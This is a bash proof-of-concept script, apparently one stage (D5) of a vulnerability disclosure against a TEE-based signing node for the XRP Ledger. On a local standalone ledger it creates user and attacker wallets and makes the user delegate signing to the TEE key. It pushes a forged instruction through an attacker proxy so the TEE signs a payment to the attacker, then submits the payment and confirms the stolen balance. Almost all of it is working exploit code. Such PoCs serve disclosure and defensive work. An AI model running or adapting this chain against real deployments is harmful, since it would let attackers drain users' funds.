#!/usr/bin/env bash
# ============================================================================
# D5 — FULL LOCAL EXECUTION: funds move from user to attacker on a local XRPL
# Prerequisites: main PoC completed with --keep --hostnet (containers running)
# Usage: bash d5.sh
# ============================================================================
set -uo pipefail
cd "$(dirname "$0")"

C='\033[1;34m'; G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; N='\033[0m'
phase(){ echo -e "\n${C}======== $1 ========${N}"; }
ok(){   echo -e "${G}[PASS]${N} $1"; D5PASS="$D5PASS\n[PASS] $1"; }
info(){ echo -e "${Y}[INFO]${N} $1"; }
fail(){ echo -e "${R}[FAIL]${N} $1"; D5FAIL=1; }
D5PASS=""; D5FAIL=0

XRPLD_RPC="http://127.0.0.1:5005"
GENESIS_ADDR="rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh"
# Try standard standalone seed first, then tutorial seed
GENESIS_SEEDS=(
  "snoPBrXtMeMyMHUVTgbuqAfg1SUTb"
)
FUND_AMOUNT="1000000000"    # 1000 XRP in drops
PAY_AMOUNT="500000000"      # 500 XRP in drops
XRPLD_PORT=5005

cleanup(){
  echo ""
  if [ "$D5FAIL" = "0" ]; then
    echo -e "${G}D5 RESULT: ALL PASS${N}"
  else
    echo -e "${R}D5 RESULT: FAILED — inspect output above${N}"
  fi
  echo "xrpld container left for inspection: docker logs poc-xrpld"
  echo "to clean up: docker rm -f poc-xrpld"
}
trap cleanup EXIT

# ---------------------------------------------------------------- find run --
WS=$(ls -d .poc-ws-* 2>/dev/null | sort | tail -1)
EV=$(ls -d poc-evidence-* 2>/dev/null | sort | tail -1)
[ -z "$WS" ] && { echo "no .poc-ws-* found"; exit 1; }
[ -z "$EV" ] && { echo "no poc-evidence-* found"; exit 1; }
echo "workspace: $WS"
echo "evidence:  $EV"

# Verify main PoC containers are running
RUNNING=$(docker compose -f "$WS/docker-compose.yml" ps --format '{{.Service}}' 2>/dev/null | wc -l | tr -d ' ')
if [ "${RUNNING:-0}" -lt 3 ]; then
  echo "ERROR: main PoC containers not running ($RUNNING/3)."
  echo "Re-run the main PoC with --keep first: ./poc.sh --keep --hostnet"
  exit 1
fi
ok "main PoC containers running ($RUNNING/3)"

# Extract TEEID from evidence summary
TEEID=$(grep -oP 'node identity via zero-auth direct action: \K0x[0-9a-fA-F]{40}' "$EV/SUMMARY.txt" 2>/dev/null | head -1)
[ -z "$TEEID" ] && { echo "ERROR: cannot extract TEEID from SUMMARY.txt"; exit 1; }
info "TEEID: $TEEID"

# Extract signer address from D4 evidence
SIGNER=$(python3 -c "
import json
r = json.load(open('$EV/forger/04-xrppay-signed-transactions.json'))
txs = json.loads(bytes.fromhex(r['result']['data'][2:]))
print(txs[0]['Signers'][0]['Signer']['Account'])
" 2>/dev/null)
[ -z "$SIGNER" ] && { echo "ERROR: cannot extract signer address from D4 evidence"; exit 1; }
ok "TEE wallet XRPL address (signer): $SIGNER"

# ---------------------------------------------------------------- Phase A --
phase "D5-A — Start local XRPL (xrpld standalone)"

docker rm -f poc-xrpld 2>/dev/null
mkdir -p "$WS/xrpld"

cat > "$WS/xrpld/xrpld.cfg" <<'XCFG'
[server]
port_rpc_admin

[port_rpc_admin]
port = 5005
ip = 127.0.0.1
admin = 127.0.0.1
protocol = http

[node_size]
tiny

[node_db]
type=NuDB
path=/var/lib/xrpld/db/nudb
advisory_delete=0

[database_path]
/var/lib/xrpld/db

[ledger_history]
16
XCFG

docker run -d --name poc-xrpld \
  --platform linux/amd64 \
  --network host \
  --entrypoint xrpld \
  -v "$WS/xrpld:/config" \
  xrpllabsofficial/xrpld:latest \
  --standalone --conf=/config/xrpld.cfg \
  || { fail "failed to start xrpld container"; docker logs poc-xrpld 2>&1 | tail -30; exit 1; }

info "waiting for xrpld RPC..."
XRPLD_UP=0
for i in $(seq 1 30); do
  RESP=$(curl -sS -m 3 "$XRPLD_RPC" \
    -H 'Content-Type: application/json' \
    -d '{"method":"server_info","params":[{}]}' 2>/dev/null)
  if echo "$RESP" | grep -q '"status"' 2>/dev/null; then
    XRPLD_UP=1; break
  fi
  sleep 2
done
if [ "$XRPLD_UP" != "1" ]; then
  fail "xrpld RPC not responding after 60s"
  docker logs poc-xrpld 2>&1 | tail -40
  exit 1
fi
ok "xrpld standalone running (RPC on $XRPLD_RPC)"

# ---------------------------------------------------------------- Phase B --
phase "D5-B — Account setup (fund + SignerList)"

xrpc(){ curl -sS -m 10 "$XRPLD_RPC" -H 'Content-Type: application/json' \
  -d "{\"method\":\"$1\",\"params\":[$2]}"; }

# --- propose user and attacker accounts
USER_JSON=$(xrpc "wallet_propose" '{"key_type":"secp256k1"}')
USER_ADDR=$(echo "$USER_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['account_id'])" 2>/dev/null)
USER_SEED=$(echo "$USER_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['master_seed'])" 2>/dev/null)
[ -z "$USER_ADDR" ] && { fail "wallet_propose (user) failed: $USER_JSON"; exit 1; }
[ -z "$USER_SEED" ] && { fail "user seed extraction failed — dump:"; echo "$USER_JSON" | python3 -m json.tool 2>/dev/null | head -15; exit 1; }
info "user account:     $USER_ADDR"

ATK_JSON=$(xrpc "wallet_propose" '{"key_type":"secp256k1"}')
ATK_ADDR=$(echo "$ATK_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['account_id'])" 2>/dev/null)
ATK_SEED=$(echo "$ATK_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['master_seed'])" 2>/dev/null)
[ -z "$ATK_ADDR" ] && { fail "wallet_propose (attacker) failed: $ATK_JSON"; exit 1; }
info "attacker account: $ATK_ADDR"

# --- fund user from genesis (try each seed)
GENESIS_SEED=""
for seed in "${GENESIS_SEEDS[@]}"; do
  FUND_RESP=$(xrpc "submit" "{\"secret\":\"$seed\",\"tx_json\":{\"Account\":\"$GENESIS_ADDR\",\"Destination\":\"$USER_ADDR\",\"Amount\":\"$FUND_AMOUNT\",\"TransactionType\":\"Payment\",\"Fee\":\"10\"}}")
  ENGINE=$(echo "$FUND_RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('result',{}).get('engine_result','?'))" 2>/dev/null)
  info "fund attempt (seed ...${seed: -8}): engine_result=$ENGINE"
  if [ "$ENGINE" = "tesSUCCESS" ] || [ "$ENGINE" = "terQUEUED" ]; then
    GENESIS_SEED="$seed"; break
  fi
done
[ -z "$GENESIS_SEED" ] && { fail "all genesis seeds failed"; echo "$FUND_RESP"; exit 1; }
ok "user funded with $FUND_AMOUNT drops from genesis"

# --- close ledger
xrpc "ledger_accept" '{}' >/dev/null
info "ledger closed (fund)"

# --- SignerListSet on user account
SL_RESP=$(xrpc "submit" "{\"secret\":\"$USER_SEED\",\"tx_json\":{\"Account\":\"$USER_ADDR\",\"TransactionType\":\"SignerListSet\",\"SignerQuorum\":1,\"SignerEntries\":[{\"SignerEntry\":{\"Account\":\"$SIGNER\",\"SignerWeight\":1}}],\"Fee\":\"10\"}}")
SL_ENGINE=$(echo "$SL_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin).get('result',{}).get('engine_result','?'))" 2>/dev/null)

# --- query fee for diagnostic
FEE_RESP=$(xrpc "fee" '{}')
MIN_FEE=$(echo "$FEE_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['drops']['minimum_fee'])" 2>/dev/null)
info "server minimum fee: ${MIN_FEE:-unknown} drops"
info "SignerListSet engine_result=$SL_ENGINE"
if [ "$SL_ENGINE" != "tesSUCCESS" ] && [ "$SL_ENGINE" != "terQUEUED" ]; then
  fail "SignerListSet failed"; echo "$SL_RESP"; exit 1
fi

# --- close ledger
xrpc "ledger_accept" '{}' >/dev/null
info "ledger closed (signerlist)"

# --- query user sequence
INFO_RESP=$(xrpc "account_info" "{\"account\":\"$USER_ADDR\",\"ledger_index\":\"validated\"}")
USER_SEQ=$(echo "$INFO_RESP" | python3 -c "import json,sys; print(int(json.load(sys.stdin)['result']['account_data']['Sequence']))" 2>/dev/null)
[ -z "$USER_SEQ" ] && { fail "account_info failed"; echo "$INFO_RESP"; exit 1; }
ok "user account ready: addr=$USER_ADDR seq=$USER_SEQ signerList=[$SIGNER w1 q1]"

# ---------------------------------------------------------------- Phase C --
phase "D5-C — TEE signs attacker-directed payment (local targets)"

# --- write D5 params for the forger
cat > "$WS/d5-params.json" <<PARAMS
{
  "sender": "$USER_ADDR",
  "recipient": "$ATK_ADDR",
  "nonce": $USER_SEQ,
  "amount": "$PAY_AMOUNT"
}
PARAMS

# --- verify forger has xrp-pay-d5 (should be built-in from poc.sh)
if ! grep -q 'xrp-pay-d5' "$WS/repo/pocforger/forger_test.go"; then
  fail "forger_test.go does not contain xrp-pay-d5 case - use the latest poc.sh which includes it"
  exit 1
fi
info "forger confirmed (xrp-pay-d5 built-in from poc.sh)"

# --- rebuild forger
info "rebuilding forger (cached, should be fast)..."
if ! docker run --rm \
  -v "$WS:/ws" -v "$WS/repo:/repo" \
  -v poc-gomodcache:/go/pkg/mod -v poc-gocache:/root/.cache/go-build \
  -w /repo -e GOFLAGS=-mod=mod \
  golang:1.25 go test -c ./pocforger/ -o /ws/forger.test \
  > "$WS/d5-forger-build.log" 2>&1; then
  fail "forger rebuild failed"; cat "$WS/d5-forger-build.log" | tail -20; exit 1
fi
ok "forger rebuilt with xrp-pay-d5"

# --- run forger xrp-pay-d5
D5_FORGE_PID=""
docker run --rm -v "$WS:/ws" \
  -e POC_FORGER_CMD=xrp-pay-d5 -e POC_FORGER_OUT=/ws/out.json \
  -e POC_FORGER_KEYS=/ws/keys -e POC_FORGER_TEEID="$TEEID" \
  -e POC_FORGER_CAPTURE=/ws/d5-params.json \
  golang:1.25 /ws/forger.test -test.run TestPocForger -test.count=1 \
  > "$WS/d5-forge-out.log" 2>&1
FORGE_EXIT=$?
if [ $FORGE_EXIT -ne 0 ]; then
  fail "forger xrp-pay-d5 failed"; cat "$WS/d5-forge-out.log" | tail -20; exit 1
fi
ok "D5 instruction built (sender=$USER_ADDR recipient=$ATK_ADDR nonce=$USER_SEQ)"

# --- push through attacker
ATTACKER_URL="http://127.0.0.1:9000"
LEGIT_URL="http://127.0.0.1:8080"
dc(){ docker compose -f "$WS/docker-compose.yml" "$@"; }
nc(){ dc exec -T attacker curl -sS --noproxy '*' --max-time 5 "$@"; }

# Get current result count
R_BEFORE=$(nc "$ATTACKER_URL/stats" | docker compose -f "$WS/docker-compose.yml" exec -T attacker jq -r .results 2>/dev/null) || R_BEFORE=0

# Push
nc -X POST "$ATTACKER_URL/actions" -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null
info "D5 instruction pushed through attacker"

# --- wait for result (goroutine posts after 1s delay + router ack)
sleep 8
R_AFTER=$(nc "$ATTACKER_URL/stats" | docker compose -f "$WS/docker-compose.yml" exec -T attacker jq -r .results 2>/dev/null) || R_AFTER=0
info "results: $R_BEFORE -> $R_AFTER"

# --- extract the D5 signed transaction (last status-1 result with opType XRP)
D5_TX=$(nc "$ATTACKER_URL/received" | python3 -c "
import json, sys
arr = json.load(sys.stdin)
for s in reversed(arr):
    try:
        r = json.loads(s)
        res = r.get('result', {})
        if res.get('status') == 1 and str(res.get('opType','')).startswith('0x465f585250'):
            print(json.dumps(r))
            break
    except: pass
")
if [ -z "$D5_TX" ]; then
  fail "no D5 signed transaction captured"
  nc "$ATTACKER_URL/received" | python3 -c "
import json,sys
arr=json.load(sys.stdin)
for i,s in enumerate(arr[-5:]):
    try: r=json.loads(s); print(i, r['result'].get('status'), r['result'].get('opType','')[:20])
    except: print(i,'parse-fail')
"
  exit 1
fi
echo "$D5_TX" > "$WS/d5-captured.json"
ok "D5 signed transaction captured (TEE-signed, multisig)"

# ---------------------------------------------------------------- Phase D --
phase "D5-D — Submit to local XRPL and verify"

# --- extract tx_json for submit_multisigned
TX_JSON=$(echo "$D5_TX" | python3 -c "
import json, sys
r = json.load(sys.stdin)
txs = json.loads(bytes.fromhex(r['result']['data'][2:]))
print(json.dumps(txs[0]))
")

# --- submit_multisigned
SUBMIT_RESP=$(echo "$TX_JSON" | python3 -c "
import json, sys
tx = json.load(sys.stdin)
payload = json.dumps({'method':'submit_multisigned','params':[{'tx_json':tx}]})
print(payload)
" | curl -sS -m 10 "$XRPLD_RPC" -H 'Content-Type: application/json' -d @-)

SUBMIT_ENGINE=$(echo "$SUBMIT_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin).get('result',{}).get('engine_result','?'))" 2>/dev/null)
info "submit_multisigned engine_result=$SUBMIT_ENGINE"

if [ "$SUBMIT_ENGINE" != "tesSUCCESS" ]; then
  fail "submit_multisigned failed"
  echo "$SUBMIT_RESP" | python3 -m json.tool 2>/dev/null || echo "$SUBMIT_RESP"
  exit 1
fi
ok "transaction accepted by ledger engine: $SUBMIT_ENGINE"

# --- close ledger
xrpc "ledger_accept" '{}' >/dev/null
info "ledger closed (payment)"

# --- verify attacker balance
ATK_INFO=$(xrpc "account_info" "{\"account\":\"$ATK_ADDR\",\"ledger_index\":\"validated\"}")
ATK_BALANCE=$(echo "$ATK_INFO" | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['account_data']['Balance'])" 2>/dev/null)
if [ -z "$ATK_BALANCE" ] || [ "$ATK_BALANCE" = "0" ]; then
  fail "attacker balance query failed or zero"; echo "$ATK_INFO"; exit 1
fi
ok "ATTACKER BALANCE: $ATK_BALANCE drops (= $(python3 -c "print($ATK_BALANCE/1000000)") XRP)"

# --- verify user balance decreased
USER_INFO=$(xrpc "account_info" "{\"account\":\"$USER_ADDR\",\"ledger_index\":\"validated\"}")
USER_BALANCE=$(echo "$USER_INFO" | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['account_data']['Balance'])" 2>/dev/null)
info "user balance after payment: $USER_BALANCE drops"

# ---------------------------------------------------------------- Phase E --
phase "D5 — RESULT"

echo "================================================================"
echo "  D5: FUNDS MOVED — FULL LOCAL EXECUTION VERIFIED"
echo "================================================================"
echo ""
echo "  user account:      $USER_ADDR"
echo "  attacker account:  $ATK_ADDR"
echo "  amount:            $PAY_AMOUNT drops ($(python3 -c "print($PAY_AMOUNT/1000000)") XRP)"
echo "  signer (TEE):      $SIGNER"
echo "  engine_result:     $SUBMIT_ENGINE"
echo "  attacker balance:  $ATK_BALANCE drops"
echo ""
echo "  CHAIN OF CUSTODY:"
echo "  1. User delegated signing to TEE wallet key (SignerListSet) — the PMW model"
echo "  2. Node bootstrap was captured by attacker (Phase 6 D2)"
echo "  3. TEE signed attacker-directed payment (Phase 6 D4 mechanism)"
echo "  4. Ledger engine ACCEPTED the multisig and EXECUTED the payment"
echo "  5. Attacker balance INCREASED — funds moved on a real XRPL engine"
echo "  6. 100% localnet — no external system touched"
echo "================================================================"
echo ""
echo "$D5PASS"

# save D5 evidence
mkdir -p "$EV/d5"
cp "$WS/d5-params.json" "$EV/d5/"
cp "$WS/d5-captured.json" "$EV/d5/"
echo "$SUBMIT_RESP" > "$EV/d5/submit-response.json"
echo "$ATK_INFO" > "$EV/d5/attacker-account-info.json"
echo "$TX_JSON" > "$EV/d5/submitted-transaction.json"
cat > "$EV/d5/D5-SUMMARY.txt" <<EOF
D5: FUNDS MOVED (local XRPL, xrpld standalone)
user: $USER_ADDR -> attacker: $ATK_ADDR
amount: $PAY_AMOUNT drops | engine: $SUBMIT_ENGINE | attacker balance: $ATK_BALANCE drops
signer (TEE wallet): $SIGNER
tee-node: v0.0.26 @ e1d5391 | netmode: host | 100% localnet
EOF
( cd "$EV/d5" && sha256sum * > SHA256SUMS 2>/dev/null )
info "D5 evidence saved to $EV/d5/"

exit $D5FAIL
